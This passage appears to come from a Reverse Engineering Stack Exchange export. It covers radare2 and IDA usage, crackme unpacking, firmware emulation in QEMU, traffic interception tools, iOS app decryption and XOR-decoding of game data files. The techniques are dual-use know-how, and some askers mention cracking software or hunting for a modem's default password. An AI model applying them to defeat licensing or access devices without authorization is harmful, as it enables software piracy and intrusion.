addr=0x00000aa7 off=0x00000aa7 ordinal=001 sz=11 len=11 section=.rodata type=A string=Password:
addr=0x00000ab2 off=0x00000ab2 ordinal=002 sz=10 len=10 section=.rodata type=A string=Good job!
addr=0x00000abc off=0x00000abc ordinal=003 sz=10 len=10 section=.rodata type=A string=Try again
</code></pre>

<p>after that referenced for ""Good job"" are looked for.</p>

<pre><code>$ radare2 crackserial_linux

 -- How about a nice game of chess?
[0x080488c4]&gt; /c ab2
f hit_0 @ 0x08048841   # 5: push 0x8048ab2
[0x080488c4]&gt;
</code></pre>

<p>I tried the same thing, but for me is not working:</p>

<pre><code>$ r2 crackserial_linux
[0x080488d0]&gt; !!rabin2 -z crackserial_linux
[strings]
addr=0x08048d80 off=0x00000d80 ordinal=000 sz=7 section=.rodata string=User:
addr=0x08048d87 off=0x00000d87 ordinal=001 sz=9 section=.rodata string=Serial:
addr=0x08048d90 off=0x00000d90 ordinal=002 sz=10 section=.rodata string=Good job!
addr=0x08048d9a off=0x00000d9a ordinal=003 sz=10 section=.rodata string=Try again

4 strings
[0x080488d0]&gt; /c d90
[0x080488d0]&gt; 
</code></pre>

<p>By the way, why are the strings in my case at different locations?</p>
","<p>Judging from the several posts you made recently it appears you do not have a proper installation may be you should try uninstalling and reinstalling the radare2 package </p>

<p>The commend <em>per se</em> seems to work correctly for me here:</p>

<pre><code>radare2-w32-0.9.9&gt; cat xxx\helloworld.cpp

#include &lt;stdio.h&gt;
int main (void) {
  printf(""hello world\n"");
  return 0;
}

radare2-w32-0.9.9&gt; radare2 xxx\helloworld.exe
[0x00401347]&gt; iz~hello world  
    vaddr=0x0041218c paddr=0x0001118c ordinal=000 sz=13 len=12 section=.rdata type=a string=hello world\n    
</code></pre>

<p><code>/c</code> uses pattern matching using <code>1118c</code> wont give you any results using <code>18c</code> will spew a lot of results think about it before asking why (that is one of the drawbacks of following tuts blindly your <code>/d90</code> or <code>/ab2</code> are falling in this category )</p>

<p>Lets search for xrefs to the virtual address    </p>

<pre><code>[0x00401347]&gt; /c 41218c
0x00401003   # 5: push 0x41218c
</code></pre>

<p>Disassemble around the hit</p>

<pre><code>[0x00401347]&gt; pd 5 @0x401000
           ;-- section..text:
           0x00401000    55             push ebp               ; 
           0x00401001    8bec           mov ebp, esp
           ;-- hit0_0:
           0x00401003    688c214100     push str.hello_world_n ; ""hello world.""
           0x00401008    e807000000     call 0x401014 ;0x00401014(unk, unk)
           0x0040100d    83c404         add esp, 4
</code></pre>
","11598"
"How to identify function calls in IDA Pro's disassembly?","8151","","<p>I am reverse engineering some code from which IDA has generated the following disassembly. These specific lines of code are just for illustrative purposes. Notice that the third line does not call a specifc function by its name but rather by its address.</p>

<pre><code>mov rcx, [rsp+128h+var_D8]    // reg CX gets the address at stack pointer+128h+var_D8 bytes 
mov r8, [rcx]                 // the address at reg CX is stored to reg r8
call qword ptr [r8 + 18h]     // at address rax+18h, call function defined by qword bytes
</code></pre>

<p>I'm interested in determining which function is being called. What mechanisms, tools, tricks, etc. can I use to determine which function in the dissassembly a call <code>qword ptr &lt;address&gt;</code> is referring to? I'm up for trying other disassembler programs.</p>

<p>From an answer to my <a href=""https://reverseengineering.stackexchange.com/questions/2119/what-to-do-when-ida-cannot-provide-a-function-name"">previous question</a>, this is known as an ""indirect call"" or (perhaps a ""virtual function call""). The disassembly has many of these, so how do I resolve them? In addition, IDA has identified hundreds of functions. How do I go about figuring out which one was actually being called during any given indirect call (or virtual call)? </p>
","<p>The easiest way to find out the function in question would probably be by dynamic analysis. You can easily do this by placing a breakpoint on that instruction in a debugger and examining the registers. </p>

<p>A more general solution would probably involve some scripting to record all calls and add that information to the IDA database. <a href=""https://github.com/deresz/funcap"">Funcap</a> plugin does something similar if not exactly what you are looking for:</p>

<blockquote>
  <p>This script records function calls (and returns) across an executable using IDA debugger API, along with all the arguments passed. It dumps the info to a text file, and also inserts it into IDA's inline comments. This way, static analysis that usually follows the behavioral runtime analysis when analyzing malware, can be directly fed with runtime info such as decrypted strings returned in function's arguments.</p>
</blockquote>
","2128"
"Is it possible to convert MIPS ASM to code?","7936","","<p><a href=""https://www.hex-rays.com/products/ida/"" rel=""nofollow"">IDA</a> can disassemble to assembly. But, reading large assembly blocks with byte shifts, etc, is tedious work. I rather would read pseudo-code. </p>

<p>Are there any documents, tutorials or tools for this work targeting MIPS platform? What methods are you people using ? Sorry if this question is off-topic but normal Google search didn't yield much for MIPS.</p>

<p>Edit: I try to decompile modem firmware image and look for default telnet password actually since WebUI passwords dont work and my ISP does not know it too.</p>
","<p>IDA's decompiler only supports ARM and x86. With that said, there are a couple you can try:</p>

<ul>
<li><a href=""http://www.backerstreet.com/rec/rec.htm"" rel=""nofollow noreferrer"">REC</a> - This one has already been mentioned. Last I used it, it would segfault when you issued the 'help' command, so YMMV.</li>
<li><a href=""http://decompiler.fit.vutbr.cz/decompilation/"" rel=""nofollow noreferrer"">Retargetable Decompiler</a> - This is an online decompiler that supports various architectures, including MIPS. It's OK at getting a general idea of how the code works, but in my experience misses important details (it showed data being written to undefined pointers, for example).</li>
<li><a href=""https://www.pnfsoftware.com/jeb2/mips"" rel=""nofollow noreferrer"">JEB</a> - JEB 2.3 is a professional reverse-engineering platform that supports native decompilation of MIPS 32-bit code. The output is interactive and can be refactored/modified, similarly to Hexrays'.</li>
</ul>

<p>Ultimately, you are probably better off learning to read the disassembly. One thing that I commonly do is manually convert individual code blocks to pseudo-code; in IDA you can then right-click on a code block, select 'Group Nodes' and replace the disassembly in that code block with whatever text you want (e.g., the pseudo code). This makes it much easier to break down and understand complex functions.</p>
","3461"
"How to find offsets in OllyDBG from IDA","7903","","<p>I'm currently trying to gain some practice in RE and I need some help for patching a DLL.
Here are my steps:
I first analyze the main program and the dll in IDA trying to understand the logic. I then switch to OllyDBG for patching. Well, the problem is, since Olly dynamically loads the dll (in contrast to the static standalone analysis in IDA), the offsets are different and I don't know how to find the offset that I've inspected in IDA.
Is there some easy way to ""rediscover"" the offset in the dll?</p>

<p>Thanks in advance!</p>
","<p>If only the base is changed, but offsets are constant (as I'd guess is the case), you can just rebase the program in IDA. You can do so by edit->segments->Rebase program ... menu. 
Specifying the same starting base in IDA as is in Olly should help. Base may be different for numerous reasons, one of which might be ASLR.</p>
","1834"
"Checking if an .exe is actually a .jar wrapped in an .exe","7901","","<p>Let's say I have a .jar file and wrap it into a .exe using any number of free utilities out there, like <a href=""http://jsmooth.sourceforge.net/"">JSmooth</a>.</p>

<p>Would it be possible to tell, given just the .exe, if it was generated using one such utility from a .jar file?</p>
","<p>I did a quick test with JSmooth and it simply places the whole .jar file in a resource. You can easily see this by opening a JSmooth executable with <a href=""http://www.angusj.com/resourcehacker/"" rel=""nofollow noreferrer"">Resource Hacker</a> as the following screen shot shows (I used sun's deploy.jar from the java lib folder):</p>

<p><img src=""https://i.stack.imgur.com/CMTvr.png"" alt=""Resource Hacker Screenshot displaying the jar as a resource""></p>

<p>For other utilities it might be different but you could use a tool like <a href=""http://www.remkoweijnen.nl/blog/2011/10/12/analysing-binaries-with-binwalk/"" rel=""nofollow noreferrer"">binwalk</a> to look for the jar/zip signature inside the exe.</p>
","54"
"Automatically convert x86 assembly to C","7892","","<p>Just started out with x86 assembly and slowly getting the hang of it. IDA produces nice graphs that make it much easier to follow all the jumps and function calls and stuff.</p>

<p>I've looked at examples of arithmetics, control flow, loops, and function calls, and feel that I could reasonably take a chunk of instructions and reproduce the same logic in Java or C.</p>

<p>Are there tools that will automatically take assembly and convert it to, say, C? I imagine for some people that at some point it becomes more of a chore than an exercise after doing it for years.</p>
","<p>Yes, that type of tool is called a <a href=""/questions/tagged/decompiler"" class=""post-tag"" title=""show questions tagged &#39;decompiler&#39;"" rel=""tag"">decompiler</a></p>

<p>Several examples below:</p>

<ul>
<li><a href=""https://www.hex-rays.com/products/decompiler/index.shtml"" rel=""nofollow noreferrer"">Hex-Rays Decompiler</a></li>
<li><a href=""http://www.hopperapp.com/"" rel=""nofollow noreferrer"">Hopper</a></li>
<li><a href=""http://www.backerstreet.com/rec/rec.htm"" rel=""nofollow noreferrer"">REC Studio</a></li>
<li><a href=""http://derevenets.com/"" rel=""nofollow noreferrer"">SmartDec</a></li>
<li><a href=""https://retdec.com/"" rel=""nofollow noreferrer"">Retargetable Decompiler</a></li>
</ul>
","4643"
"Unpacking UPX packed (possibly scrambled) executable","7788","","<p>I've decided to reverse <a href=""https://mega.co.nz/#!iEpDETIY!h0xZgdQ7etqJBUupq-yIcglj79aQcs-fQnRW898n4Wc"" rel=""nofollow noreferrer"">this</a> crackme. Obviously it's packed. I was told by PeID that there is only UPX inside. Ok, but <code>upx -d</code> simple crashed that's why I've concluded that this UPX may be scrambled somehow.</p>

<p><img src=""https://i.stack.imgur.com/XEm04.png"" alt=""IDA warning""></p>

<p>Binary didn't run properly in debugger(windbg) for unpacking it so I've dumped exe from working process and tried to fix imports. Maybe I should have tried Olly with plugins? However IDA still warns me that some imports might be destroyed(see picture). My question is: did I unpacked it correctly? If no what else should I do to unpack it?</p>

<p><a href=""https://mega.co.nz/#!OU4X1a4Y!00wN9c72-4nRtNgF5t7ZdGLxDzjYE9G6CNakblHBUOs"" rel=""nofollow noreferrer"">Unpacked</a></p>
","<p><a href=""https://mega.co.nz/#F!OAx0wL7K!gLPZh7pkMv7d8as5serOmg"" rel=""noreferrer"">Here</a> you can find bunch of tools for unpacking upx. One of them(Upx Unpacker 0.2) solved my issue. Every unpacker should be used in specific case and this list  may be incomplete. </p>
","8319"
"Advantages of OllyDbg 1 over OllyDbg 2","7742","","<p>I see that most RE tutorials around the web that give RE examples use OllyDbg 1, even if the tutorial was written after the release of OllyDbg 2.</p>

<p>Is there any particular reason for that? Is version 2 too buggy, or were some of the features dropped?</p>
","<p>Well, there is another reason. Historical one, actually.</p>

<p>At end of 2001, when the first versions of Ollydbg were presented, there was SoftICE, which was at its end, and IDA was not that popular yet. So OllyDBG became sort of the de-facto replacement for the main black-hat tool for cracking\patching\keygen-writing. And OllyDBG 1.x is a good, handy tool.</p>

<p>Since then, the development of OllyDBG became a slow process, with lots of delays. When it was finally announced, there appeared to be some problems, plug-ins compatibility etc. You may see the  story at OllyDBG 2.x <a href=""http://www.ollydbg.de/version2.html"">webpage</a> on offsite.</p>

<p>On the other hand, IDA Pro of Hex-Rays proved itself as a useful tool, very handy.</p>

<p>The bottom line - when in June 2010 version 2.0 of OllyDBG was released, it was buggy, didn't support old plug-ins and there were no reason to change to the new version, at least for me. In addition, many manuals were available for version 1.x, and the benefits of version 2.0 for tasks OllyDBG was used for were not attractive enough, IMHO.</p>

<p>End of story :)</p>
","1638"
"Why my Resource Hacker doesn't work with some .EXE files","7618","","<p>I use <a href=""http://www.angusj.com/resourcehacker/"" rel=""nofollow"">Resource Hacker</a> Application for Reverse Engineering purposes, I've cracked 3 softwares by using this software, but it doesn't grab all <code>.EXE</code>, <code>.DLL</code> files.<br>
sometimes It says, This is not a valid Win32 executable file, but I've provided it a valid Win32 File.
<br>
Any Solution please, Thanks in advance</p>
","<p><a href=""http://www.angusj.com/resourcehacker/"" rel=""nofollow"">According to the developer of Resource Hacker</a>, this product is discontinued (and hasn't been updated since Sep 2011):</p>

<blockquote>
  <p>I have been overwhelmed by the interest in Resource HackerTM, the
  emails of thanks, encouragement and suggestions. It's been downloaded
  many millions of times. However, I've moved on to other things and
  have no plans to continue its development. Please don't ask for the
  source code, I'm not releasing it, nor is it for sale. Colin Wilson
  has written an open source Resource Editor which may interest those
  looking for source code. Otherwise, Anders Melander has also created
  another excellent Resource Editor which is still being developed.</p>
</blockquote>

<p>While this is not a direct answer as to why Resource Hacker can't work with some PE files, you may follow the author's suggestion to try out the open-source <a href=""http://www.wilsonc.demon.co.uk/d10resourceeditor.htm"" rel=""nofollow"">XN Resource Editor</a> or Anders Melander's <a href=""http://melander.dk/reseditor/"" rel=""nofollow"">free Resource Editor</a>.</p>

<p>If you can reproduce the same issues in Colin Wilson's open-source XN Resource Editor, it may be much easier to inspect (via Delphi's debugger) and find the root cause.</p>
","2061"
"Emulate TP-LINK WR740N with QEMU","7553","","<p>I'm trying to emulate a TP-Link WR740N in Qemu (MIPS). I have extracted the <code>rootfs.img</code> from the firmware, and downloaded <code>vmlinux-2.6.32-5-4kc-malta</code> from here: <a href=""http://people.debian.org/~aurel32/qemu/mips/"" rel=""nofollow"">http://people.debian.org/~aurel32/qemu/mips/</a>.</p>

<p>Then, I started Qemu with these parameters:</p>

<pre><code>qemu-system-mips -M malta -kernel 'vmlinux-2.6.32-5-4kc-malta' -hda 'rootfs.img' -append ""root=/dev/sda1 console=tty0"" -nographic
</code></pre>

<p>And it got stuck on:</p>

<pre><code>[0.000000] console [tty0] enabled, bootconsole disabled
</code></pre>

<p>I've also tried to run it like this:</p>

<pre><code>sudo qemu-system-mips -M malta -initrd 'rootfs.img' -kernel 'vmlinux-2.6.32-5-4kc-malta' -nographic -append ""console=ttyS0,115200 root=/dev/sda rootfstype=jffs2 init=/sbin/init"" -hda 'hda.img' 
</code></pre>

<p>and I get this error:</p>

<pre><code>[    0.796000]  sda: unknown partition table
[    0.808000] sd 0:0:0:0: [sda] Attached SCSI disk
[    0.812000] RAMDISK: squashfs filesystem found at block 0
[    0.812000] RAMDISK: Loading 2556KiB [1 disk] into ram disk... done.
[    0.928000] VFS: Cannot open root device ""sda"" or unknown-block(8,0)
[    0.928000] Please append a correct ""root="" boot option; here are the available partitions:
[    0.928000] 0800           65536 sda driver: sd
[    0.932000] Kernel panic - not syncing: VFS: Unable to mount root fs on unknown-block(8,0)
</code></pre>

<p>New try after answer from 6EQUJ5 [I still get the same error though (the second one)]:</p>

<p>This is what I'm trying:</p>

<pre><code>sudo qemu-system-mips -M malta -kernel 'vmlinux-2.6.32-5-4kc-malta' -nographic -append ""init=/bin/sh"" -hda 'myFileSystem.img'
</code></pre>

<p>And this is a link to download the filesystem I've created:</p>

<pre><code>http://speedy.sh/vBUEQ/myFileSystem.img
</code></pre>

<p>Running ""file"" on my filesystem:</p>

<pre><code>Linux rev 1.0 ext2 filesystem data (mounted or unclean), UUID=dac7072e-2c8b-408f-a080-57ea60cfd9ea
</code></pre>

<p>Those are the commands I've used to create it and move the files into it:</p>

<pre><code>dd if=/dev/zero of=~/myFileSystem.img bs=1024 count=65536
mke2fs myFileSystem.img
mkdir /mnt/virtual
mount -o loop ~/myFileSystem.img /mnt/virtual
</code></pre>
","<p>I was able to get that firmware to a shell by doing the following:</p>

<ol>
<li>Unpacking the squashfs image</li>
<li>Create a filesystem image formatted to ext2 and copying the unpacked squashfs contents into that, and using that as <code>-hda</code></li>
<li>Running without <code>-initrd ...</code> and appending <code>init=/bin/sh</code> to the kernel command line</li>
</ol>

<p>Although you are not fully emulating the WR740N because most of the hardware is missing and it is a different kernel.  Emulating a router in qemu is always going to be a partial process because of that.</p>
","4483"
"Can I create an object file using gcc that cannot be reverse engineered?","7530","","<p>Is it possible to create an object file using <code>gcc</code> that cannot be reverse engineered to its source code ?</p>
","<p>AFAIK that is not possible. There are other things you can keep in mind however:</p>

<p>Use of the GCC optimization flags will help make the code look much less readable to a human. When you compile with the highest level of optimization <code>gcc -O3</code> the compiler will move things around such that the ""flow"" might not be at all what you expect. </p>

<p>You can also use the flag <code>-static</code> which will force gcc to take small functions and make them inline. This will embed them into your code instead of showing as function calls.. it will make them harder to distinguish. </p>

<p>One thing to keep in mind is too it's important to get rid of any unneeded symbols. Gcc offers <code>-fvisibility=hidden</code> and <code>-fvisibility-inlines-hidden</code> to help with this. You can also pass the <code>-s</code> flag to gcc to strip symbols away.</p>

<p>I think that's about all you can do with <em>gcc</em> to help prevent reverse engineering. Additionally you can use code obfuscation, but there are issues there as well unless you implement it yourself, if you use a readily available method or tool to prevent reverse engineering, there is probably already a tool to counter it.</p>

<p>Keep in mind that the final executable will have information in it as well such as what version of gcc it was compiled with. This too can be removed with the <code>strip</code> command. </p>

<p>If I have an executable (<code>myprog</code>) I can run <code>objdump</code> on it to check some information:</p>

<pre><code>mike@mike-VirtualBox:~/C$ objdump --full-contents --section=.comment myprog | head
myprog:     file format elf64-x86-64

Contents of section .comment:
 0000 4743433a 20285562 756e7475 2f4c696e  GCC: (Ubuntu/Lin
 0010 61726f20 342e362e 332d3175 62756e74  aro 4.6.3-1ubunt
 0020 75352920 342e362e 3300               u5) 4.6.3.   
</code></pre>

<p>Oops, you can see what version/compiler I used. Well, we can fix that:</p>

<pre><code>mike@mike-VirtualBox:~/C$ strip -R .comment -R .note myprog
mike@mike-VirtualBox:~/C$ objdump --full-contents --section=.comment myprog | head
objdump: 
section '.comment' mentioned in a -j option, but not found in any input file
myprog:     file format elf64-x86-64
</code></pre>

<p>There are other portions you can strip as well, such as <code>.note.ABI-tag</code> but you do lose portability</p>
","58"
"How to reverse engineer a proprietary data file format (e.g. Smartboard Notebook)?","7423","","<p>How should I begin trying to reverse engineer this file format? The only thing I can think of is saving a simple file, and then dig in with a hex editor. But since the file format may be some kind of archive, that seems like the wrong approach. I've always been a little interested in the idea of reverse-engineering a file format, but I never actually attempted it. How should I begin?</p>

<p>In particular, I am interested in <a href=""http://smarttech.com/us/Solutions/Education+Solutions/Products+for+education/Software/SMART+Notebook+collaborative+learning+software/SMART+Notebook+collaborative+learning+software"">Smart Notebook</a> which loads and saves data into .notebook files.  This is an undocumented proprietary file format. SMART is the leading manufacturer of white boards and their notebook software is therefore one of the most popular formats for educational (presentation) content. There is an open standard for whiteboard files and <a href=""http://open-sankore.org/"">Open Sankore</a> is an open source program that can open and save them.  However, Smart Notebook is not fully compatible with the open whiteboard format so I really would like to understand the .notebook file format so that I can write software that makes use of it. The open stand (.iwb files) are zip archives that contain images and SVG data. It occurs to me that .notebook files may also be compressed or at least contain a number of sub-files within it (like images and swf files).  </p>
","<p>Well, obviously the particulars will very much depend on the particulars of the file format and what you expect to achieve in general. However, some steps will largely be the same. One thing you could do is:</p>

<ol>
<li>try hard to find all kinds of clues about the format. This can be a small note in some bulletin board or the cached copy of some year old website that has since vanished. Often the gems won't pop up as top search results when you are looking for something specific enough. Weeding through pages of search results <em>can make sense</em>. Als make sure to use tools such as <code>file</code> which look for magic bytes and would be able to identify things not obvious to the naked eye.</li>
<li>find a proprietary program that uses the format and is able to read/write it (you seem to have that)
<ol>
<li>Use a trial &amp; error technique such as making distinct changes to the document, saving them and observing and noting down the differences, AFAIK this is how the MS Office file formats were decoded initially for StarOffice (now OOo and LibreOffice)</li>
<li>reverse engineer the program itself to find the core routines reading and writing the data format</li>
</ol></li>
<li>find an open source program in the same way -> read its source</li>
</ol>

<p>If you understand the language in which the program from option 3 is written, no problem at all. If you don't have that or if you are faced with other challenges then you have to resort to the good old technique outlined in point 2, patching gaps with pieces you gather with method 1.</p>

<p>The point 2.1 should be obvious: you want to find out how recursive text is encoded? Type some text, format it, save, observe the change. Rinse, lather, repeat.</p>

<p>Point 2.2 will take a lot more effort and should likely be used sparsely to make sure you got details from 2.1 right.</p>
","264"
"Reversing network protocol","7304","","<p>I have a DVR that sends video over Ethernet using its own propriety TCP protocol. I want to write a VLC module to view the video, rather than the supplied DxClient.exe. I have captured traffic in wireshark and attempted to reverse engineer the client with IDA Pro, from what I can tell the client does some kind of handshake authentication, the DVR then sends 2 network packets (always 1514 bytes long), the client sends a TCP ACK and 2 more packets are transmitted, etc.etc... forever. From what I can tell the client uses Microsoft's AVIFIL32 library to decompress the packets to what essentially become AVI file frames.</p>

<p>The problem is I don't understand how these frames are encoded or if they even are AVI frames. Can anyone help me, here is the data payload from 2 packets:</p>

<p><a href=""http://pastebin.com/2VDu2Tc2"">http://pastebin.com/2VDu2Tc2</a></p>

<p><a href=""http://pastebin.com/L3Zi3VqU"">http://pastebin.com/L3Zi3VqU</a></p>
","<p>You can try Netzob tool. This is a tool dedicated to reverse engineering protocols.</p>

<ul>
<li>You can download it here : <a href=""http://www.netzob.org/"">http://www.netzob.org/</a></li>
<li>A great example w/ ZeroAccess C&amp;C protocol : <a href=""http://www.netzob.org/documentations/presentations/netzob_29C3_2012.pdf"">http://www.netzob.org/documentations/presentations/netzob_29C3_2012.pdf</a></li>
</ul>

<p>You can also take a look at CANAPE : <a href=""http://www.contextis.com/research/tools/canape/"">http://www.contextis.com/research/tools/canape/</a></p>
","2494"
"Decrypting IPA Binary on OS X","7183","","<p>I've been reading <a href=""http://media.hacking-lab.com/scs3/scs3_pdf/SCS3_2011_Bachmann.pdf"" rel=""noreferrer"">this PDF on reverse-engineering iOS applications</a> and have reached slide 39, decrypting the binary. However, I've been attempting to disassemble and explore the binary in OS X 10.9.5 rather than iOS, since my phone is not jailbroken and I'd prefer not to do so.</p>

<p>I downloaded the IPA file from the App Store by using <a href=""https://newspaint.wordpress.com/2012/11/05/node-js-http-and-https-proxy/"" rel=""noreferrer"">a forward proxy</a> running locally on my laptop to intercept the download request on my iPhone and replicate it on my laptop. From there I followed <a href=""http://osxdaily.com/2011/04/07/extract-and-explore-an-ios-app-in-mac-os-x/"" rel=""noreferrer"">these directions</a> to extract the encrypted binary from the IPA file, and used the directions from the PDF file to check whether it was encrypted. I confirmed that it was encrypted because the output from <code>otool</code> was:</p>

<pre><code>Load command 11
          cmd LC_ENCRYPTION_INFO
      cmdsize 20
    cryptoff  8192
    cryptsize 15187968
    cryptid   1
</code></pre>

<p>Is there a way to decrypt the DRM using only my Apple computer?</p>
","<p>Currently you can't decrypt iOS apps without a device. The encryption keys are ultimately protected by an unknown key which is burned into the processor and cannot be extracted using software, that's why no ""offline"" decryption app has been made.</p>
","11680"
"Is it possible to extract or otherwise edit the source code of an .exe file?","6965","","<p>I have a small executable that I downloaded from the net, and that runs in the Command Line, which makes me think it may be a DOS program. The program works perfectly, but due to being developed by a non-English speaker, the interface/presentation of it needs to be cleaned up to make it look a little more professional. Is it possible to get to the file's source code and edit it?</p>
","<p>Principally: Yes.<br>
But: it's not practically.</p>

<p>You could change the machine-code within the .exe, but that's not really practically if you want to change the interface/presentation. Also you would need to do it at least in assembly language.<br>
If you want to improve the software, I think, the best would be to contact the developer and ask if you can help him to improve the software.</p>

<p>If you want to take a look inside the .exe anyway you could try <a href=""http://www.ollydbg.de/"" rel=""nofollow noreferrer"">OllyDbg</a>.</p>

<p>If you want to change something in such an existing program, you have basically 3 ways to do it:  </p>

<ol>
<li><p>Changing the machine code itself:<br>
The representation of the machine code does not need to be 1's and 0's, you can use any other number system. Anyway machine code is really, really hard to read and edit. Additionally you have also the same problems like you 'simply' disassemble the program.  </p></li>
<li><p>Use a disassembler and modify the assembler code:<br>
You have to take care of the memory layout of the software you want to modify. Since any change on some string could override another variable. And assembler is also not easy to read and write. So depending on the size of the software, it takes some time to get a basic overview about where to change the code.</p></li>
<li><p>Or use a decompiler:<br>
But you mostly won't get any useful variable names, since the compiler removes them most of the time. </p></li>
</ol>

<p>Another point you have to take a look at is anti debugging and reverse engineering tools. They may prevent from running the piece of code inside debugger like OllyDbg or getting useful decompiled code.<br>
Also take a look at <a href=""https://reverseengineering.stackexchange.com/a/11677/4427"">peter ferrie's answer</a>.</p>
","11675"
"How to see what data is being transmitted when an application calls home?","6818","","<p>Always wondered how it would be possible to see what data is being transmitted back and forth with an application that calls home.</p>

<p>Let's say we emulate the server via host file redirect. Would it be possible to see what requests are being made by the application?</p>

<p>Also is it possible at all to intercept the response(and view data) from the real server before it reaches the application?</p>
","<p>You may capture the traffic with packet sniffer to capture all the communications of client\server application, or You may use reverse proxy to intercept and alter data in real time.</p>

<p>In simple words, network sniffers allow You to see data flow between client and server, analyse it and reverse the protocol communications
Reverse proxy intercept communication between client and server, allow alter the requests and re-send them, manipulate and examine in real time.</p>

<p><strong>Network sniffers:</strong></p>

<p><a href=""https://www.wireshark.org/"">WireShark</a> </p>

<p><a href=""http://www.tcpdump.org/"">tcpdump</a></p>

<p><a href=""https://www.winpcap.org/windump/"">WinDump</a></p>

<p><strong>Reverse Proxy:</strong></p>

<p><a href=""https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project"">ZAP (OWASP Project)</a></p>

<p><a href=""https://code.google.com/p/vulture/downloads/list"">Vulture</a></p>

<p><a href=""http://www.portswigger.net/burp/help/proxy.html"">Burp Proxy</a></p>

<p><a href=""https://fiddler2.com/fiddler2/"">Fiddler</a> (most recommended for Web\malware analysis)</p>

<p>You may see <strong>samples of successful use of such technique</strong> here:</p>

<p><a href=""http://gursevkalra.blogspot.co.il/2011/06/intercepting-blackberry-application.html"">Intercepting Blackberry Application Traffic</a> </p>

<p><a href=""http://www.randomsync.net/2010/07/intercepting-ssl-traffic-using.html"">Intercepting SSL traffic using WebScarab</a> </p>

<p><a href=""http://www.thesprawl.org/research/ios-data-interception/"">iOS data interception</a></p>
","1632"
"How to display memory zones content on IDA Pro?","6771","","<p>This is a very naive question about IDA Pro. Once the IDA debugger started, I would like to be able to type a memory address (or a memory zone) and look easily at the content of it (in various format). With <code>gdb</code> you would do <code>print /x *0x80456ef</code> or, if you want a wider zone, <code>x /6x 0x80456ef</code>.</p>

<p>So, what is the best way to display the memory content from the IDA debugger ?</p>
","<p>In <a href=""http://code.google.com/p/idapython/"" rel=""noreferrer"">IDAPython</a> (<a href=""https://www.hex-rays.com/products/ida/support/idapython_docs/"" rel=""noreferrer"">documentation</a>) you can do something like this to print a byte/word/double word:</p>

<pre><code>Dword(0x80456ef)
Word(0x80456ef)
Byte(0x80456ef)
</code></pre>

<p>Or, to print an arbitrary number of bytes:</p>

<pre><code>for b in GetManyBytes(0x40138E, 10):
    print ""%X"" % ord(b)
</code></pre>

<p>If running in the debugger, call it like this: </p>

<pre><code>GetManyBytes(0x40138E, 10, True)
</code></pre>
","1910"
"Extract text data from a compressed/encrypted .DAT file","6734","","<p><strong>Hello,</strong></p>

<p>I'm from Uruguay so I'll make my best effort to explain my ""problem"" in english.
I want to read some text that is inside a .DAT file, but is ""encrypted"" or ""compressed"" (I don't know which is the right ""term"" for this). The file is from the game SMITE, and this file has basically most of the text in the game (like unreleased Item descriptions) and that's why I want to read the file :D</p>

<p><strong>Previous versions of the file could be readed with Notepad ++, like this:</strong>
<a href=""https://i.stack.imgur.com/LCi71.png"" rel=""nofollow noreferrer"">http://i.stack.imgur.com/LCi71.png</a></p>

<p>But current versions are just random letters and <strong>NULL</strong> characters. (I can't post a picture because of the ""only two links"" restriction).</p>

<p>I'm interested in just two files. One, is named ""Lang_INT.dat"", inside the Localization folder, there is another file in that folder named ""GFxTranslation.int"", which has some text that appears in the Lobby Screen and things like that, that's why the ""Localization"" folder has to be where the text is... but in the first picture that I shared, you can see text that appears in-game and also in the lobby screen, and it's on another folder named ""Content"" and the file is named ""assembly.dat"", with another file named ""behavior_trees.dat"" but I think that file is not important to me.</p>

<p>By the way, this maybe would be usefull as a ""reference"", there is another .DAT file named ""word filter"" which (i suppose) has the ""bad words"" that are censored in the chat if the word filter is activated. This .DAT is inside the Localization folder.</p>

<h2><a href=""https://mega.nz/#!eJ5QiLDD!lxbfkGmKBmJ7OoXQoIjcH7adAhIn7I8Cka2CCTLyPsw"" rel=""nofollow noreferrer"">Here is a link with ALL the .DAT mentioned in this post</a></h2>

<p>I'll appreciate any kind of help on this, I did some research but I did not find anything that is usefull... the only thing that I know is: A person who has no knowledge about programing or ""some"" knowledge, could ""de-compress"" ""decrypt"" one of this files...or that is what looks like, and no, that person do not want to help me :c</p>

<p>Thanks in advance again, and sorry for bad English:</p>

<p>-Agustín</p>
","<p>These files are definitely not compressed. behavior_trees.dat is a binary file which is not encrypted and not compressed, just binary. Encryption, as far as I can see, looks like substitution cipher which should be relatively easy to crack with frequency analysis if you know what should be there. Assuming that decrypted content of files from older and newer versions are similar you can try to account frequencies of symbols on a base of files of previous versions.</p>

<p>Here is what I'd do for decrypting (for example) assembly.dat file:</p>

<ol>
<li>Get a corresponding file from previous version which should be not encrypted.</li>
<li>Account frequency of appearance of each symbol (should be easily done with simple python script)</li>
<li>Account frequency of appearance of each symbol in newer version files.</li>
<li>Try to replace symbols from the newer files to the symbols with same (or alike) appearance rate from the older file and see what happends.</li>
</ol>

<p>UPDATE, Just for the sake of completeness:</p>

<p>I used an excellent tool <a href=""http://blog.didierstevens.com/programs/xorsearch/"" rel=""nofollow"">XorSearch</a> by Didier Stevens (it was mentioned by @Andy Dove in answer to another question, which reminded me to return to this one) and found out the following:</p>

<ul>
<li>Assuming that the decrypted content of current file is similar to content of previous I tried to find some words from the picture you provided with this tool (for example words like item, Pickup and Physical) .</li>
<li>The tool shows that it is xor substitution cipher, the key is 0x2a, applying it to word filter  and lang int files gives reasonable result.</li>
<li>Applying this key gives a lot of reasonable strings, for all files I tried the key was the same.</li>
<li>According to your claim you know some basics in programming. Which means that you'll be able to run the following python script on your files and understand what happens or translate it to the language of your choice.</li>
</ul>

<p>Good luck.</p>

<pre><code>import os
import sys

f = open(sys.argv[1], ""rb"")
o = open(sys.argv[2], ""wb"")

data = f.read()

for d in data:
    o.write("""" + chr (ord(d) ^ 0x2a))


f.close()
o.close()
</code></pre>
","11662"
"Immunity Debugger on Windows 10?","6732","","<p>Has anybody gotten Immunity Debugger to work on windows 10 yet? I downloaded it on Windows 10, launch it as administrator, and the GUI opens for about half a second and then it exits, no errors or messages. I have python installed, I reinstalled immunity multiple times, and I tried running it in Windows 7 compatibility mode. Nothing seems to work. My theory is that some dll is missing or changed. Any ideas or is it just my computer? Also, Ollydbg does work on 10, but I find Immunity debugger more useful.</p>
","<p>I am running Windows 10 x64 and I had the same problem as you do. The problem is with the environment variables regarding your Python installation. I am using Python 2.7.11 which is the currently latest release for the 2.x series. </p>

<p>So, to make Immunity Debugger work on Windows 10 modify(and ADD if necessary) the following environment variables(assuming Python is installed at <code>C:\Python27</code>):</p>

<ul>
